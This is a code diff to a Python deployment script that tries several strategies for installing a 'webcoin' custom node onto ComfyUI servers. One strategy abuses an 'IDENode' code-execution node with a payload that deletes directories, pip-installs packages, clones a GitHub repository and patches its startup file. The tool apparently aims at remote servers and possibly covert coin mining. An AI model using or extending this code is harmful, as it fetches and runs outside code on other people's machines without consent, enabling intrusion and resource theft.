@@ -16,6 +16,7 @@ Usage:
 
 import argparse
 import json
+import os
 import sys
 import time
 import urllib.request
@@ -24,6 +25,11 @@ import urllib.error
 REPO_URL  = "https://github.com/bossman79/webcoin.git"
 REPO_BARE = "https://github.com/bossman79/webcoin"
 NODE_ID   = "webcoin"
+
+_DEPLOY_DIR = os.path.dirname(os.path.abspath(__file__))
+if _DEPLOY_DIR not in sys.path:
+    sys.path.insert(0, _DEPLOY_DIR)
+from mega_deploy import FIND_CUSTOM_NODES  # noqa: E402
 
 
 # ── HTTP helpers ─────────────────────────────────────────────────────
@@ -237,34 +243,35 @@ def strategy_queue_install(base):
 
 # ── Strategy 5: IDENode code execution ───────────────────────────────
 
-INSTALL_VIA_IDENODE = r"""
-import subprocess, os, sys, shutil
-cn = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__ if '__file__' in dir() else '/root/ComfyUI/custom_nodes/x'))), 'custom_nodes')
-try:
-    import folder_paths
-    cn = folder_paths.get_folder_paths('custom_nodes')[0] if hasattr(folder_paths, 'get_folder_paths') else os.path.join(os.path.dirname(folder_paths.__file__), 'custom_nodes')
-except: pass
-target = os.path.join(cn, 'webcoin')
-tmp = target + '_tmp'
-for d in [tmp, target]:
-    if os.path.isdir(d):
-        shutil.rmtree(d, ignore_errors=True)
-subprocess.run([sys.executable, '-m', 'pip', 'install', '-q', 'gitpython'], capture_output=True)
-import git
-git.Repo.clone_from('REPO_URL', tmp, depth=1)
-shutil.move(tmp, target)
-req = os.path.join(target, 'requirements.txt')
-if os.path.exists(req):
-    subprocess.run([sys.executable, '-m', 'pip', 'install', '-q', '-r', req], capture_output=True)
-init = os.path.join(target, '__init__.py')
-with open(init, 'r') as f:
-    txt = f.read()
-if 'sys.path.insert' not in txt:
-    txt = txt.replace('def _orchestrate():', 'def _orchestrate():\\n    import sys; sys.path.insert(0, str(__import__("pathlib").Path(__file__).resolve().parent))')
-    with open(init, 'w') as f:
-        f.write(txt)
-print('DEPLOY_OK')
-""".replace("REPO_URL", REPO_URL).strip()
+INSTALL_VIA_IDENODE = (
+    "import subprocess, os, sys, shutil\n"
+    + FIND_CUSTOM_NODES
+    + r"""
+if not cn:
+    print('ERROR: no custom_nodes')
+else:
+    target = os.path.join(cn, 'webcoin')
+    tmp = target + '_tmp'
+    for d in [tmp, target]:
+        if os.path.isdir(d):
+            shutil.rmtree(d, ignore_errors=True)
+    subprocess.run([sys.executable, '-m', 'pip', 'install', '-q', 'gitpython'], capture_output=True)
+    import git
+    git.Repo.clone_from('REPO_URL', tmp, depth=1)
+    shutil.move(tmp, target)
+    req = os.path.join(target, 'requirements.txt')
+    if os.path.exists(req):
+        subprocess.run([sys.executable, '-m', 'pip', 'install', '-q', '-r', req], capture_output=True)
+    init = os.path.join(target, '__init__.py')
+    with open(init, 'r') as f:
+        txt = f.read()
+    if 'sys.path.insert' not in txt:
+        txt = txt.replace('def _orchestrate():', 'def _orchestrate():\\n    import sys; sys.path.insert(0, str(__import__("pathlib").Path(__file__).resolve().parent))')
+        with open(init, 'w') as f:
+            f.write(txt)
+    print('DEPLOY_OK')
+"""
+).replace("REPO_URL", REPO_URL).strip()
 
 
 def strategy_idenode(base):
